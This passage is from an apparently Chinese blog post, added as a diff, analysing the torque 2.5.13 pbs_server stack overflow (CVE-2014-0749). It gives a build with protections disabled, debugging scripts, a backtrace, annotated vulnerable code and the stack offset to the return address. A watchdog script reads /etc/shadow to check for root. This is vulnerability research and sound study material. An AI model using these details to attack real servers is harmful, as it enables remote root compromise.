@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="http://localhost:4000/assets/fonts/fonts.css"/>
+<link rel="stylesheet" href="http://localhost:4000/assets/style.css"/>
+<link rel="stylesheet" href="http://localhost:4000/assets/js/lity.min.css"/>
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta property="og:site_name" content="极目楚天舒" />
+<meta 
+    property="og:title"
+    content="
+        
+            torque-2.5.13栈溢出分析
+        
+    " 
+/>
+
+<meta property="og:url" content="http://localhost:4000//userspace/2025/04/14/torque-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90.html" />
+
+    <meta property="og:type" content="article" />
+
+
+
+    <meta property="fb:app_id" content="" />
+
+
+
+<title>
+    
+        torque-2.5.13栈溢出分析
+    
+</title>
+</head>
+<body class="index">
+    
+        <div class="page-container">
+            <aside class="main-sidebar">
+                <!-- 包含 TOC -->
+                <sidebar class="sidebar">
+<ul class="toc-list"><li><a href="#漏洞信息">漏洞信息</a></li><li><a href="#环境搭建">环境搭建</a><ul><li><a href="#torque软件介绍">torque软件介绍</a></li><li><a href="#torque的编译与使用">torque的编译与使用</a></li><li><a href="#实验环境搭建">实验环境搭建</a><ul><li><a href="#看门狗编写">看门狗编写</a></li><li><a href="#pwndbg启动脚本编写">pwndbg启动脚本编写</a></li></ul></li></ul></li><li><a href="#漏洞分析">漏洞分析</a><ul><li><a href="#漏洞函数定位">漏洞函数定位</a></li><li><a href="#漏洞原理">漏洞原理</a></li></ul></li><li><a href="#漏洞利用">漏洞利用</a><ul><li><a href="#发生栈溢出的现场">发生栈溢出的现场</a></li><li><a href="#payload构造和函数栈帧">payload构造和函数栈帧</a><ul><li><a href="#shellcode执行版本">shellcode执行版本</a></li><li><a href="#rop版本">rop版本</a></li></ul></li><li><a href="#利用代码">利用代码</a><ul><li><a href="#rop版本可绕nx">rop版本（可绕NX）</a></li><li><a href="#shellcode版本关闭nx">shellcode版本（关闭NX）</a></li></ul></li></ul></li><li><a href="#参考资料">参考资料</a></li></ul></sidebar>
+            </aside>
+            <!-- 主内容区域 -->
+            <main class="main-content">
+                <header class="header">
+    <section class="logo">
+        <a href="http://localhost:4000/" class="logo__link">
+            
+                <h1>极目楚天舒</h1>
+            
+        </a>
+    </section>
+    <button id="menuToggle">
+        <div></div>
+        <div></div>
+        <div></div>
+    </button>
+    <nav class="menu">
+        
+<ul class="list primary">
+
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/linux_kernel.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/tux.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Linux kernel</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/linux_userspace.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/userspace.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Linux userspace</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/hardware.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/chip.svg"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Hardware</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/meltdown_spectre.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/meltdown_spectre.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Side Channel</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/riscv.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/riscv.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Riscv</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+</ul>
+    </nav>
+</header>
+                
+                <article class="post">
+
+    <div class="post__title">
+       torque-2.5.13栈溢出分析
+    </div>
+    <div class="post__meta"> 
+        <div class="post__meta__category">
+            
+                <p class="post__meta__category__title" style="background: var(--c-themeHueRed)">Userspace</p>
+            
+        </div>
+        <p class="post__meta__divider">·</p>
+        <div class="post__meta__date">
+            April 14, 2025
+        </div>
+        
+    </div>
+
+    
+
+    <div class="post__content">
+        <p>漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。
+攻击者可以获取远程root shell</p>
+
+<h1 id="漏洞信息">漏洞信息</h1>
+
+<p>漏洞编号：<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0749">cve-2014-0749</a>， <a href="https://www.exploit-db.com/exploits/33554">EDB-33554</a></p>
+
+<p>简介：漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。</p>
+
+<p>影响范围：2.5 ~ 2.5.13</p>
+
+<p>效果：攻击者可以获取远程root shell</p>
+
+<p>内存控制能力：</p>
+
+<ul>
+  <li>没有NULL截断，可随意写入</li>
+  <li>栈上面的内容可控，无添加</li>
+  <li>溢出长度可控</li>
+  <li>没有内容过滤</li>
+</ul>
+
+<h1 id="环境搭建">环境搭建</h1>
+
+<h2 id="torque软件介绍">torque软件介绍</h2>
+
+<p>torque是分布式计算管理软件，pbs_server接收来自用户的作业请求，把作业请求根据计算节点的负载情况进行分配，下发到计算节点运行。</p>
+
+<p>pbs_server负责监控每个计算节点的工作状态，适当时候进行作业调度。</p>
+
+<p>漏洞发生在pbs_server接收用户的作业请求的时候，对用户的网络输入没有做长度检查，直接复制到栈上面导致的栈溢出漏洞。</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84.jpg" alt="torque-软件架构.jpg" /></p>
+
+<h2 id="torque的编译与使用">torque的编译与使用</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd </span>torque-2.5.13
+
+<span class="c"># 关闭保护，添加调试符号 #</span>
+<span class="nv">$ </span>./configure <span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">"-fno-stack-protector -z execstack -no-pie -z norelro -g"</span>
+<span class="nv">$ </span>make
+<span class="nv">$ </span><span class="nb">sudo </span>make <span class="nb">install</span>
+
+<span class="c"># 默认配置，执行torque.setup脚本，参数是普通用户的用户名 #</span>
+<span class="nv">$ </span><span class="nb">sudo</span> ./torque.setup <span class="nb">test</span> 
+
+<span class="c"># 拷贝启动脚本到/etc/init.d目录</span>
+<span class="nv">$ </span><span class="nb">sudo cp </span>contrib/init.d/debian.pbs_server /etc/init.d/pbs_server
+<span class="nv">$ </span><span class="nb">sudo </span>update-rc.d pbs_server defaults
+
+<span class="c"># 启动pbs_server服务</span>
+<span class="nv">$ </span><span class="nb">sudo</span> /etc/init.d/pbs_server restart
+</code></pre></div></div>
+
+<h2 id="实验环境搭建">实验环境搭建</h2>
+
+<h3 id="看门狗编写">看门狗编写</h3>
+
+<p>调试过程中pbs_server会被反复打崩，每次崩溃后需要自动重启。</p>
+
+<p>看门狗的功能是每隔1秒检查一下pbs_server服务的15001端口是否开放，如检测不到15001端口说明服务崩溃，重启pbs_server服务。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c"># 看门狗，监控pbs_server服务，确保挂掉后能够重启 </span>
+<span class="c"># 以sudo权限执行脚本</span>
+check_root<span class="o">(){</span>
+    <span class="nb">cat</span> /etc/shadow <span class="o">&gt;</span> /dev/null 2&gt;&amp;1
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"please run as root privilege"</span>
+        <span class="k">return </span>127
+    <span class="k">else
+        return </span>0
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+check_port<span class="o">(){</span>
+    netstat <span class="nt">-ltnp</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">":15001"</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+        return </span>0        <span class="c"># 15001端口开放</span>
+    <span class="k">else
+        return </span>1        <span class="c"># 15001端口关闭</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+<span class="c"># 重启pbs_server服务</span>
+restart_pbs_server<span class="o">(){</span>
+    <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2">: 15001 shutdown, restarting pbs_server ..."</span>
+    /etc/init.d/pbs_server restart
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2">: pbs_server restart success! "</span>
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2">: error pbs_server restart failed! "</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+<span class="c"># 主循环，每隔1秒检查一次</span>
+<span class="k">if</span> <span class="o">!</span> check_root<span class="p">;</span> <span class="k">then 
+    </span><span class="nb">exit </span>1
+<span class="k">fi
+
+while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
+    if</span> <span class="o">!</span> check_port<span class="p">;</span> <span class="k">then
+        </span>restart_pbs_server
+    <span class="k">fi
+    </span><span class="nb">sleep </span>1
+<span class="k">done</span>
+</code></pre></div></div>
+
+<h3 id="pwndbg启动脚本编写">pwndbg启动脚本编写</h3>
+
+<p>在服务端需要用pwndbg附加进程的方式对pbs_server进行调试</p>
+
+<p>提取pbs_server的进程号，再使用-p参数attach上去调试。</p>
+
+<p>需要注意的是容器启动参数需要 –cap-add=SYS_PTRACE 权限，否则不能attach进程。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="nv">pid</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-ef</span> | <span class="nb">grep</span> <span class="nt">-w</span> <span class="s2">"pbs_server"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
+<span class="nb">sudo </span>pwndbg <span class="nt">-p</span> <span class="nv">$pid</span> <span class="nt">--symbols</span><span class="o">=</span><span class="s2">"bin/pbs_server"</span>
+</code></pre></div></div>
+
+<h1 id="漏洞分析">漏洞分析</h1>
+
+<h2 id="漏洞函数定位">漏洞函数定位</h2>
+
+<p>根据漏洞公告提供的栈回溯信息：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c">#0 0x0000003dd4a88b9a in memcpy () from /lib64/libc.so.6</span>
+<span class="c">#1 0x00007fa0008cb65b in tcp_gets (fd=11, str=0x7fff8dfce741 '3' &lt;repeats 26 times&gt;,</span>
+<span class="s2">"Ab1Ab2Ab3"</span>,
+<span class="nv">ct</span><span class="o">=</span>332<span class="o">)</span> at ../Libifl/tcp_dis.c:567
+<span class="c">#2 0x00007fa0008be994 in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,</span>
+<span class="nv">count</span><span class="o">=</span>333<span class="o">)</span>
+at ../Libdis/disrsi_.c:187
+<span class="c">#3 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,</span>
+<span class="nv">count</span><span class="o">=</span>&lt;value optimized out&gt;<span class="o">)</span> at ../Libdis/disrsi_.c:216
+<span class="c">#4 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,</span>
+<span class="nv">count</span><span class="o">=</span>&lt;value optimized out&gt;<span class="o">)</span> at ../Libdis/disrsi_.c:216
+<span class="c">#5 0x00007fa0008bdfab in disrfst (stream=11, achars=33, value=0x27f0b58 "")</span>
+at ../Libdis/disrfst.c:125
+<span class="c">#6 0x00007fa0008c13ba in decode_DIS_ReqHdr (sock=11, preq=0x27f0b20,</span>
+<span class="nv">proto_type</span><span class="o">=</span>0x7fff8dfce9dc,
+<span class="nv">proto_ver</span><span class="o">=</span>0x7fff8dfce9d8<span class="o">)</span> at ../Libifl/dec_ReqHdr.c:141
+<span class="c">#7 0x0000000000409ba1 in dis_request_read (sfds=11, request=0x27f0b20) at dis_read.c:137</span>
+<span class="c">#8 0x000000000041cb6e in process_request (sfds=11) at process_request.c:355</span>
+<span class="c">#9 0x00007fa0008d4899 in wait_request (waittime=&lt;value optimized out&gt;, SState=0x72c258)</span>
+at ../Libnet/net_server.c:508
+<span class="c">#10 0x000000000041afeb in main_loop () at pbsd_main.c:1203</span>
+<span class="c">#11 0x000000000041bd15 in main (argc=&lt;value optimized out&gt;, argv=&lt;value optimized out&gt;)</span>
+at pbsd_main.c:1760
+
+</code></pre></div></div>
+
+<p>可以整理出如下函数调用过程：</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque.jpg" alt="torque.jpg" /></p>
+
+<p>画框的部分是递归，递归层数根据攻击者的输入而定。</p>
+
+<h2 id="漏洞原理">漏洞原理</h2>
+
+<p>从socket句柄获取数据是从disrsi_函数开始的：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">disrfst</span><span class="p">(</span><span class="kt">int</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">size_t</span>  <span class="n">achars</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">value</span><span class="p">){</span>
+  <span class="kt">int</span>  <span class="n">locret</span><span class="p">;</span>
+  <span class="kt">int</span>  <span class="n">negate</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="n">count</span><span class="p">;</span>
+  <span class="n">locret</span> <span class="o">=</span> <span class="n">disrsi_</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">negate</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>用户的输入格式如下，使用ASCII编码的字符串来表示十进制数，前一级指示后一级数字的长度，递归调用disrsi_函数来解析。</p>
+
+<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-payload.jpg" alt="torque-payload.jpg" /></p>
+
+<p>disrsi_ 函数的作用是递归解析用户输入，第一次调用 disrsi_ 的 count=1，表示读取第一个字节，就是上图的“3”，表示下一级的长度为3个字符，解析出来3传递给下一次递归调用的 count 参数；</p>
+
+<p>第二次递归调用 disrsi_ 的 count 等于上一次解析出来的3，这次会读取“123”并转化成unsigned 传递给下一次递归的 count 参数；</p>
+
+<p>第三次递归调用 disrsi_ 的 count 等于123，作为下一次递归调用的 count 参数。</p>
+
+<p>第四次递归调用 disrsi_ 会认为后面的十进制数字的长度是123个字符，因此会从socket句柄读取123字节存放到 scratch 数组中，而该数组的长度为65字节，造成了溢出。</p>
+
+<p>每一次递归都会重新分配 disrsi_ 函数栈帧，因此覆盖的返回地址是回到上一级 disrsi_ 函数的地址。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">disrsi_</span><span class="p">(</span><span class="kt">int</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">negate</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">unsigned</span>  <span class="n">count</span><span class="p">){</span>
+  <span class="kt">int</span>  <span class="n">c</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="n">locval</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="n">ndigs</span><span class="p">;</span>
+  <span class="kt">char</span>  <span class="o">*</span><span class="n">cp</span><span class="p">;</span>
+  <span class="kt">char</span>  <span class="n">scratch</span><span class="p">[</span><span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>     <span class="c1">//被溢出的对象, 长度为65</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">dis_umaxd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">disiui_</span><span class="p">();</span>   <span class="c1">//计算dis_umaxd的值</span>
+    
+	<span class="c1">// 函数指针调用，实际调用tcp_getc函数, 获取1字节tcp数据</span>
+	<span class="c1">// 判断 正负号 以及用户输入是不是一个合法的十进制字符串</span>
+  <span class="k">switch</span> <span class="p">(</span><span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">dis_getc</span><span class="p">)(</span><span class="n">stream</span><span class="p">))</span> 
+  <span class="p">{</span>
+    <span class="k">case</span> <span class="sc">'-'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'+'</span><span class="p">:</span>
+      <span class="o">*</span><span class="n">negate</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'-'</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span><span class="p">){</span> <span class="c1">//</span>
+        <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
+      <span class="p">}</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">dis_umaxd</span><span class="p">){</span>    <span class="c1">// 经过调试，dis_umaxd=10</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">dis_umaxd</span><span class="p">)</span>    <span class="c1">// 该变量的意义是unsigned int的最大值为0xffff_ffff</span>
+          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>          <span class="c1">// 化为十进制就是4294967295，长度为10个字符</span>
+                                  <span class="c1">// 意义就是unsigned int的最大数需要用10个数字来表示十进制值</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="n">dis_umax</span><span class="p">,</span> <span class="n">dis_umaxd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>
+      <span class="p">}</span>                           <span class="c1">// 以上处理用户输入超过unsigned int表示范围的情况</span>
+      <span class="n">cp</span> <span class="o">=</span> <span class="n">scratch</span><span class="p">;</span>
+      <span class="n">locval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+      <span class="k">do</span>
+        <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(((</span><span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">cp</span><span class="o">++</span><span class="p">)</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;</span> <span class="sc">'9'</span><span class="p">))</span>
+          <span class="p">{</span>
+          <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
+          <span class="p">}</span>
+
+        <span class="n">locval</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">locval</span> <span class="o">+</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">count</span><span class="p">);</span>
+      <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">locval</span><span class="p">;</span>
+      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_SUCCESS</span><span class="p">);</span>
+
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>     <span class="c1">//第一个数字不能是0</span>
+      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_LEADZRO</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'8'</span><span class="p">:</span>
+    <span class="k">case</span> <span class="sc">'9'</span><span class="p">:</span>
+      <span class="n">ndigs</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>    <span class="c1">//计算十进制字符串的长度</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
+      <span class="c1">//tcp_gets</span>
+        <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">){</span>
+          <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
+        <span class="p">}</span>
+        
+        <span class="n">cp</span> <span class="o">=</span> <span class="n">scratch</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">dis_umaxd</span><span class="p">){</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">dis_umaxd</span><span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+
+          <span class="o">*</span><span class="n">cp</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
+
+          <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="n">dis_umax</span><span class="p">,</span> <span class="n">dis_umaxd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">count</span><span class="p">){</span>
+          <span class="k">if</span> <span class="p">(((</span><span class="n">c</span> <span class="o">=</span> <span class="o">*++</span><span class="n">cp</span><span class="p">)</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;</span> <span class="sc">'9'</span><span class="p">)){</span>
+            <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
+          <span class="p">}</span>
+
+          <span class="n">ndigs</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">ndigs</span> <span class="o">+</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">}</span>    <span class="cm">/* END if (count &gt; 1) */</span>
+
+ <span class="c1">// 递归调用disrsi_</span>
+      <span class="k">return</span><span class="p">(</span><span class="n">disrsi_</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">negate</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">ndigs</span><span class="p">));</span>
+      <span class="k">break</span><span class="p">;</span>
+      
+    <span class="k">case</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
+      <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+      <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOF</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="nl">default:</span>
+      <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="o">*</span><span class="n">negate</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+
+<span class="nl">overflow:</span>
+	  <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">UINT_MAX</span><span class="p">;</span>
+	  <span class="k">return</span><span class="p">(</span><span class="n">DIS_OVERFLOW</span><span class="p">);</span>
+  <span class="p">}</span>  
+
+</code></pre></div></div>
+
+<p>每一次的递归都会产生一个disrsi_函数栈，其中包含一个新的scratch数组。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">tcp_gets</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">ct</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">tcpdisbuf</span> <span class="o">*</span><span class="n">tp</span><span class="p">;</span>
+  <span class="n">tp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">tcparray</span><span class="p">[</span><span class="n">fd</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">readbuf</span><span class="p">;</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_eod</span> <span class="o">-</span> <span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_leadp</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="n">ct</span><span class="p">){</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">tcp_read</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">){</span>
+      <span class="k">return</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>  <span class="cm">/* Error or EOF */</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+<span class="c1">// 漏洞点，把获取到的tcp数据拷贝到str数组，没有进行长度检查</span>
+<span class="c1">// str指向父函数disrsi_中定义的 char  scratch[DIS_BUFSIZ+1]; </span>
+<span class="c1">// scratch数组长度为65字节</span>
+  <span class="n">memcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">str</span><span class="p">,</span> <span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_leadp</span><span class="p">,</span> <span class="n">ct</span><span class="p">);</span>
+
+  <span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_leadp</span> <span class="o">+=</span> <span class="n">ct</span><span class="p">;</span>
+
+  <span class="k">return</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">ct</span><span class="p">);</span>
+<span class="p">}</span>  <span class="cm">/* END tcp_gets() */</span>
+
+</code></pre></div></div>
+
+<p>scratch数组到rbp的距离为0x60，到返回地址距离为0x68：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:000000000000E134 <span class="p">;</span> <span class="o">===============</span> S U B R O U T I N E <span class="o">=======================================</span>
+.text:000000000000E134
+.text:000000000000E134 <span class="p">;</span> Attributes: bp-based frame
+.text:000000000000E134
+.text:000000000000E134 <span class="p">;</span> int __cdecl disrsi_<span class="o">(</span>int stream, int <span class="k">*</span>negate, unsigned int <span class="k">*</span>value, unsigned int count<span class="o">)</span>
+.text:000000000000E134 disrsi_         proc near          <span class="p">;</span> CODE XREF: _disrsi__localalias+4↑j
+.text:000000000000E134                                    <span class="p">;</span> disrsi_+3B1↓p
+.text:000000000000E134                                    <span class="p">;</span> DATA XREF: ...
+.text:000000000000E134
+.text:000000000000E134 value           <span class="o">=</span> qword ptr <span class="nt">-78h</span>
+.text:000000000000E134 negate          <span class="o">=</span> qword ptr <span class="nt">-70h</span>
+.text:000000000000E134 count           <span class="o">=</span> dword ptr <span class="nt">-68h</span>
+.text:000000000000E134 stream          <span class="o">=</span> dword ptr <span class="nt">-64h</span>
+.text:000000000000E134 scratch         <span class="o">=</span> byte ptr <span class="nt">-60h</span>    <span class="p">;</span>scratch数组距离返回地址0x68字节
+.text:000000000000E134 c               <span class="o">=</span> dword ptr <span class="nt">-14h</span>
